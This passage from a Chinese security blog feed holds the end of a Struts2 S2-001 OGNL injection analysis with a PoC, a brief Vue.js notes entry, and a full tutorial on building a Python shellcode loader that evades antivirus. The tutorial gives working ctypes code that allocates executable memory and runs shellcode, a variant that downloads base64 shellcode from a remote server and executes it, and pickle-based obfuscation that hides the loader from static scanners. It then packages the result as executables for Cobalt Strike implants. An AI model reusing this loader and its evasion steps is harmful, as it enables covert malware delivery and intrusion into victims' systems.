<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201218153626893.png" alt="image-20201218153626893"></p>
<p>发现该方法重名加载</p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201218153722178.png" alt="image-20201218153722178"></p>
<p>我们传入<code>translateVariables</code> 方法的表达式 <code>expression</code> 为 <code>%{password}</code> ，经过 <code>OGNL</code>表达式解析，程序会获得其值 <code>%{1+1}</code>(这里就是我们传入的payload)。由于此处使用的是 <code>while</code>循环来解析<code>OGNL</code> ，所以获得的<code>%{1+1}</code>又会被再次循环解析，最终也就造成了任意代码执行。</p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201218154234294.png" alt="image-20201218154234294"></p>
<p>关键代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">translateVariables</span><span class="params">(<span class="keyword">char</span> open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator)</span> </span>&#123;</span><br><span class="line">        Object result = expression;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> start = expression.indexOf(open + <span class="string">"&#123;"</span>);</span><br><span class="line">            <span class="keyword">int</span> length = expression.length();</span><br><span class="line">            <span class="keyword">int</span> x = start + <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">char</span> c = expression.charAt(x++);</span><br><span class="line">                <span class="keyword">if</span> (c == <span class="string">'&#123;'</span>) &#123;</span><br><span class="line">                    ++count;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">'&#125;'</span>) &#123;</span><br><span class="line">                    --count;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> end = x - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (start == -<span class="number">1</span> || end == -<span class="number">1</span> || count != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String <span class="keyword">var</span> = expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line">            Object o = stack.findValue(<span class="keyword">var</span>, asType);</span><br><span class="line">            <span class="keyword">if</span> (evaluator != <span class="keyword">null</span>) &#123;</span><br><span class="line">                o = evaluator.evaluate(o);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String left = expression.substring(<span class="number">0</span>, start);</span><br><span class="line">            String right = expression.substring(end + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (o != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (TextUtils.stringSet(left)) &#123;</span><br><span class="line">                    result = left + o;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result = o;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                    result = result + right;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                expression = left + o + right;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = left + right;</span><br><span class="line">                expression = left + right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>因此究其原因，在于在<code>translateVariables</code>中，递归解析了表达式，在处理完<code>%{password}</code>后将<code>password</code>的值直接取出并继续在<code>while</code>循环中解析，若用户输入的<code>password</code>是恶意的<code>OGNL</code>表达式，比如<code>%{1+1}</code>，则得以解析执行。</p>
<p>POC：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">%&#123;<span class="number">1</span>+<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>增加了了递归解析的判断</p>
<p><img src="/img/Struts2-001-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201224171538096.png" alt="image-20201224171538096"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://xz.aliyun.com/t/7915" target="_blank" rel="noopener">https://xz.aliyun.com/t/7915</a></p>
<p><a href="https://xz.aliyun.com/t/2044" target="_blank" rel="noopener">https://xz.aliyun.com/t/2044</a></p>
<p><a href="https://dean2021.github.io/posts/s2-001/" target="_blank" rel="noopener">https://dean2021.github.io/posts/s2-001/</a></p>
<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
]]></content>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue.js 学习笔记</title>
    <url>/2020/12/14/Vue.js/</url>
    <content><![CDATA[<iframe id="embed_dom" name="embed_dom" frameborder="0" style="display:block;width:100%; height:600px;" src="https://www.processon.com/view/link/5fd6d7185653bb06f33b70d6"></iframe>

<a id="more"></a>

<p>PNG格式</p>
<p><a href="http://assets.processon.com/chart_image/5fcf37041e085306e0e6c8b1.png" target="_blank" rel="noopener">http://assets.processon.com/chart_image/5fcf37041e085306e0e6c8b1.png</a></p>
]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Shellcode加载器绕过AV</title>
    <url>/2020/12/07/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/</url>
    <content><![CDATA[<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">免杀技术大致分为有以下几类：</span><br><span class="line">特征码修改</span><br><span class="line">花指令免杀</span><br><span class="line">加壳免杀</span><br><span class="line">内存免杀</span><br><span class="line">二次编译</span><br><span class="line">分离免杀</span><br><span class="line">资源修改</span><br><span class="line">...</span><br><span class="line">Ps: 不管使用哪种技术，能绕过AV(AntiVirus)达到效果的，都是好的。</span><br></pre></td></tr></table></figure>

<p>采用分离免杀，即利用ShellCode和Python制作的加载器进行分离。</p>
<p>主要将ShellCode进行编码，分离及反序列化达到bypass的思路和方法。</p>
<a id="more"></a>

<h4 id="ShellCode"><a href="#ShellCode" class="headerlink" title="ShellCode"></a>ShellCode</h4><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">什么是<span class="keyword">ShellCode?</span></span><br><span class="line"><span class="keyword">答：一段用于利用软件漏洞而执行的代码</span></span><br></pre></td></tr></table></figure>

<p>这里我们利用Cobalt Strike生成的ShellCode</p>
<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205145223046.png" alt="image-20201205145223046"></p>
<h4 id="ShellCode加载器"><a href="#ShellCode加载器" class="headerlink" title="ShellCode加载器"></a>ShellCode加载器</h4><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">什么是<span class="keyword">ShellCode加载器？</span></span><br><span class="line"><span class="keyword">答：即专门用于加载所提供ShellCode的工具。</span></span><br></pre></td></tr></table></figure>

<p>以Python为例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="comment"># "msfvenom -p windows/x64/exec CMD=calc.exe -f python"生成的计算器的ShellCode</span></span><br><span class="line">shellcode =  <span class="string">b"\xfcH\x83\xe4\xf0\xe8\xc0\x00\x00\x00AQAPRQVH1\xd2eH\x8bR`H\x8bR\x18H\x8bR H\x8brPH\x0f\xb7JJM1\xc9H1\xc0\xac&lt;a|\x02, A\xc1\xc9\rA\x01\xc1\xe2\xedRAQH\x8bR \x8bB&lt;H\x01\xd0\x8b\x80\x88\x00\x00\x00H\x85\xc0tgH\x01\xd0P\x8bH\x18D\x8b@ I\x01\xd0\xe3VH\xff\xc9A\x8b4\x88H\x01\xd6M1\xc9H1\xc0\xacA\xc1\xc9\rA\x01\xc18\xe0u\xf1L\x03L$\x08E9\xd1u\xd8XD\x8b@$I\x01\xd0fA\x8b\x0cHD\x8b@\x1cI\x01\xd0A\x8b\x04\x88H\x01\xd0AXAX^YZAXAYAZH\x83\xec AR\xff\xe0XAYZH\x8b\x12\xe9W\xff\xff\xff]H\xba\x01\x00\x00\x00\x00\x00\x00\x00H\x8d\x8d\x01\x01\x00\x00A\xba1\x8bo\x87\xff\xd5\xbb\xf0\xb5\xa2VA\xba\xa6\x95\xbd\x9d\xff\xd5H\x83\xc4(&lt;\x06|\n\x80\xfb\xe0u\x05\xbbG\x13roj\x00YA\x89\xda\xff\xd5calc.exe\x00"</span></span><br><span class="line"> </span><br><span class="line">shellcode = bytearray(shellcode)</span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(len(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 放入shellcode</span></span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(len(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(<span class="number">-1</span>))</span><br></pre></td></tr></table></figure>

<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204183555152.png" alt="image-20201204183555152"></p>
<h4 id="分离"><a href="#分离" class="headerlink" title="分离"></a>分离</h4><p>这里通过本地请求Http Server获取ShellCode内容并进行加载执行。</p>
<p>将ShellCode放置VPS上，这里利用Python起一个临时的http服务。</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">python3 -m http.<span class="keyword">server</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204181858175.png" alt="image-20201204181858175"></p>
<p>通过request请求来获取ShellCode进行加载执行从而实现分离。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">shellcode</span> = urllib.request.urlopen(<span class="string">'http://192.168.1.1:8000/test.txt'</span>).read()</span><br></pre></td></tr></table></figure>

<h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><p>我么可以对ShellCode进行混淆编码加密等，再有本地可执行程序进行解密执行，这里我们以Base64编码处理为例，处理过后ShellCode页面如下。</p>
<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204182834063.png" alt="image-20201204182834063"></p>
<h4 id="下载ShellCode并执行"><a href="#下载ShellCode并执行" class="headerlink" title="下载ShellCode并执行"></a>下载ShellCode并执行</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes,urllib.request,codecs,base64</span><br><span class="line"></span><br><span class="line">shellcode = urllib.request.urlopen(<span class="string">'http://192.168.1.1:8000/test.txt'</span>).read()  <span class="comment"># 请求pyload（base64格式）</span></span><br><span class="line">shellcode = base64.b64decode(shellcode) <span class="comment"># base64解密</span></span><br><span class="line">shellcode =codecs.escape_decode(shellcode)[<span class="number">0</span>] <span class="comment"># </span></span><br><span class="line">shellcode = bytearray(shellcode) <span class="comment"># 返回新字节数组</span></span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(len(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 放入shellcode</span></span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(len(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(<span class="number">-1</span>))</span><br></pre></td></tr></table></figure>

<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>经过了上文的那些操作，使用<code>pyinstaller</code>将我们的程序打包成可执行程序，仍然会给杀软进行查杀。</p>
<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205105822973.png" alt="image-20201205105822973"></p>
<p>因为我们使用的加载器本身关键语句已经被检测，因此我们需要对其进行进一步处理从而绕过静态查杀，我们绕过的方式可以通过上文说过的混淆、编码、加密等方式对代码进行处理，然后进行调用执行。但是像执行命令的<code>exec</code>、<code>eval</code>等函数特征比较明显，所以我们对它也需要进一步处理。</p>
<p>跟其他语言一样，Python也有序列化的功能，官方库里提供了pickle/cPickle的库用于序列化和反序列化，可以序列化python的任何数据结构，包括一个类，一个对象。</p>
<p>Python反序列化中 ，有几个内置方法会在对象反序列化时调用，这一点和PHP中的<code>__wakeup()</code>魔术方法类似，都是因为每当反序列化过程开始或者结束时 , 都会自动调用这类函数。（这一点可以去了解一下：python中的反序列化安全问题）</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">__reduce__<span class="comment">()</span>  </span><br><span class="line">__reduce_ex__<span class="comment">()</span> </span><br><span class="line">__setstate__<span class="comment">()</span></span><br><span class="line">可参考官方文档：https:<span class="comment">//docs.python.org/zh-cn/dev/library/pickle.html</span></span><br></pre></td></tr></table></figure>

<p>以<code>__reduce__()</code>为例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = <span class="number">2</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">print</span>, (self.a+self.b,))</span><br><span class="line"></span><br><span class="line">serialize = pickle.dumps(A()) <span class="comment"># 序列化</span></span><br><span class="line">print(serialize)</span><br><span class="line"></span><br><span class="line">unserialize = pickle.loads(serialize) <span class="comment"># 反序列化</span></span><br></pre></td></tr></table></figure>

<p>通过<code>pickle</code>的<code>loads</code>来反序列化并自动执行了</p>
<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204233028982.png" alt="image-20201204233028982"></p>
<p>从输出的结果我们还是可以看到调用的关键函数名称，可以对其进行混淆、编码、加密等操作，这里以<code>Base64</code>编码为例，序列化、编码，解码、反序列化代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = <span class="number">2</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">print</span>, (self.a+self.b,))</span><br><span class="line"></span><br><span class="line">serialize = pickle.dumps(A()) <span class="comment"># 序列化</span></span><br><span class="line">print(serialize)</span><br><span class="line">print(<span class="string">"========分割线==========="</span>)</span><br><span class="line">serialize_encode = base64.b64encode(serialize) <span class="comment">#进行base64编码</span></span><br><span class="line">print(serialize_encode)</span><br></pre></td></tr></table></figure>

<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205155425112.png" alt="image-20201205155425112"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">serialize_encode = <span class="string">b'gASVHAAAAAAAAACMCGJ1aWx0aW5zlIwFcHJpbnSUk5RLA4WUUpQu'</span></span><br><span class="line">serialize_decode = base64.b64decode(serialize_encode)</span><br><span class="line">unserialize = pickle.loads(serialize_decode) <span class="comment"># 反序列化</span></span><br></pre></td></tr></table></figure>

<p>从代码层面来看，看到的是一段正常的base64编码以及反序列化的脚本文件，达到bypass的效果。</p>
<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205155553287.png" alt="image-20201205155553287"></p>
<h4 id="反序列化应用"><a href="#反序列化应用" class="headerlink" title="反序列化应用"></a>反序列化应用</h4><p>结合上述说的利用反序列化来进行对我们的ShellCode加载来处理：</p>
<p>先进行序列化操作并进行base64编码,得到base64编码后的序列化：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes,urllib.request,codecs,base64,pickle</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"""</span></span><br><span class="line"><span class="string">shellcode = urllib.request.urlopen('http://192.168.1.1:8000/test.txt').read()  # 请求pyload（base64格式）</span></span><br><span class="line"><span class="string">shellcode = base64.b64decode(shellcode) # base64解密</span></span><br><span class="line"><span class="string">shellcode =codecs.escape_decode(shellcode)[0] # </span></span><br><span class="line"><span class="string">shellcode = bytearray(shellcode) # 返回新字节数组</span></span><br><span class="line"><span class="string"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span></span><br><span class="line"><span class="string"># 申请内存</span></span><br><span class="line"><span class="string">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"># 放入shellcode</span></span><br><span class="line"><span class="string">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="string">    ctypes.c_uint64(ptr), </span></span><br><span class="line"><span class="string">    buf, </span></span><br><span class="line"><span class="string">    ctypes.c_int(len(shellcode))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line"><span class="string">handle = ctypes.windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.c_uint64(ptr), </span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.pointer(ctypes.c_int(0))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"># 等待上面创建的线程运行完</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))"""</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span>(<span class="keyword">exec</span>,(shellcode,))</span><br><span class="line"></span><br><span class="line"><span class="comment">#序列化、编码</span></span><br><span class="line">ret = pickle.dumps(A())</span><br><span class="line">ret_base64 = base64.b64encode(ret)</span><br></pre></td></tr></table></figure>

<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-202012051534357041.png" alt="image-20201205153435704"></p>
<p>再进行base64解码、反序列化操作，执行脚本，正常上线。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes,urllib.request,codecs,base64,pickle</span><br><span class="line"><span class="comment">#解码、反序列化</span></span><br><span class="line">ret_base64 = <span class="string">b"gASVKwQAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFgMBAAACnNoZWxsY29kZSA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly84MS42OC4yMzUuMjE5OjgwMDAvdGVzdC50eHQnKS5yZWFkKCkKc2hlbGxjb2RlID0gYmFzZTY0LmI2NGRlY29kZShzaGVsbGNvZGUpCnNoZWxsY29kZSA9Y29kZWNzLmVzY2FwZV9kZWNvZGUoc2hlbGxjb2RlKVswXQpzaGVsbGNvZGUgPSBieXRlYXJyYXkoc2hlbGxjb2RlKQojIOiuvue9rlZpcnR1YWxBbGxvY+i/lOWbnuexu+Wei+S4umN0eXBlcy5jX3VpbnQ2NApjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYy5yZXN0eXBlID0gY3R5cGVzLmNfdWludDY0CiMg55Sz6K+35YaF5a2YCnB0ciA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKSwgY3R5cGVzLmNfaW50KDB4MzAwMCksIGN0eXBlcy5j........"</span> </span><br><span class="line">pickle.loads(base64.b64decode(ret_base64))</span><br></pre></td></tr></table></figure>

<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205154002722.png" alt="image-20201205154002722"></p>
<h4 id="生成可执行文件"><a href="#生成可执行文件" class="headerlink" title="生成可执行文件"></a>生成可执行文件</h4><h5 id="pyinstaller"><a href="#pyinstaller" class="headerlink" title="pyinstaller"></a>pyinstaller</h5><figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">pyinstaller </span><span class="built_in">--noconsole</span> <span class="built_in">--onefile</span> <span class="string">demo1.</span><span class="string">py </span>-i <span class="string">favicon.</span><span class="string">ico </span>-n <span class="string">demo1 </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">--onefile</span> 打包一个单个文件</span><br><span class="line"><span class="built_in">--noconsole</span> 使用<span class="string">Windows子</span>系统执行.当程序启动的时候不会打开命令行(只对<span class="string">Windows有</span>效)</span><br><span class="line">-i 设置生成执行文件的图标</span><br><span class="line">-n 设置生成执行文件的名字</span><br><span class="line"><span class="comment"># pyinstaller参数可参考：https://pyinstaller.readthedocs.io/en/v3.3.1/usage.html</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205154952238.png" alt="image-20201205154952238"></p>
<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205154735442.png" alt="image-20201205154735442"></p>
<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205155120792.png" alt="image-20201205155120792"></p>
<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205224811833.png" alt="image-20201205224811833"></p>
<p>部分AV对<code>Pyinstaller</code>打包的程序检测较为敏感，即使是仅打包<code>print(1)</code>这种代码都有类似的结果</p>
<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207153229920.png" alt="image-20201207153229920"></p>
<h5 id="py2exe"><a href="#py2exe" class="headerlink" title="py2exe"></a>py2exe</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">python</span> <span class="selector-tag">setup</span><span class="selector-class">.py</span> <span class="selector-tag">py2exe</span></span><br><span class="line">注: <span class="selector-tag">py2exe</span>为0<span class="selector-class">.10</span><span class="selector-class">.1</span><span class="selector-class">.0</span>版本，亲测<span class="selector-tag">python3</span><span class="selector-class">.6</span><span class="selector-class">.0</span>、<span class="selector-tag">python3</span><span class="selector-class">.7</span><span class="selector-class">.0</span>、<span class="selector-tag">python3</span><span class="selector-class">.7</span><span class="selector-class">.4</span>、<span class="selector-tag">python3</span><span class="selector-class">.7</span><span class="selector-class">.9</span>可生成可执行文件并正常打开,<span class="selector-tag">python3</span><span class="selector-class">.8</span><span class="selector-class">.0</span>、<span class="selector-tag">python3</span><span class="selector-class">.8</span><span class="selector-class">.2</span>、<span class="selector-tag">python3</span><span class="selector-class">.9</span><span class="selector-class">.0</span> 生成执行文件无法正常使用。</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># setup.py 用于py2exe打包</span></span><br><span class="line"><span class="keyword">from</span> distutils.core <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">import</span> py2exe</span><br><span class="line">setup(</span><br><span class="line">    options=&#123;</span><br><span class="line">        <span class="string">'py2exe'</span>: &#123;</span><br><span class="line">            <span class="string">'optimize'</span>: <span class="number">2</span>, <span class="comment"># 优化级别最高，</span></span><br><span class="line">            <span class="string">'bundle_files'</span>: <span class="number">1</span>, <span class="comment"># 将生成的调用文件打包进exe文件</span></span><br><span class="line">            <span class="string">'compressed'</span>: <span class="number">1</span>, <span class="comment"># 压缩</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    windows=[&#123;<span class="string">"script"</span>: <span class="string">"demo2.py"</span>, <span class="comment">#需要打包的程序的文件路径，windows-&gt;GUI exe的脚本列表,console-&gt; 控制台exe的脚本列表</span></span><br><span class="line">              <span class="string">"icon_resources"</span>: [(<span class="number">1</span>, <span class="string">"favicon.ico"</span>)]&#125;], <span class="comment"># 程序的图标的图片路径</span></span><br><span class="line">    zipfile=<span class="literal">None</span>, <span class="comment"># 不生成library.zip文件，则捆绑在可执行文件中</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207144921636.png" alt="image-20201207144921636"></p>
<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207163850250.png" alt="image-20201207163850250"></p>
<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207150048052.png" alt="image-20201207150048052"></p>
<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207150125561.png" alt="image-20201207150125561"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.cnblogs.com/Akkuman/p/11851057.html" target="_blank" rel="noopener">https://www.cnblogs.com/Akkuman/p/11851057.html</a></p>
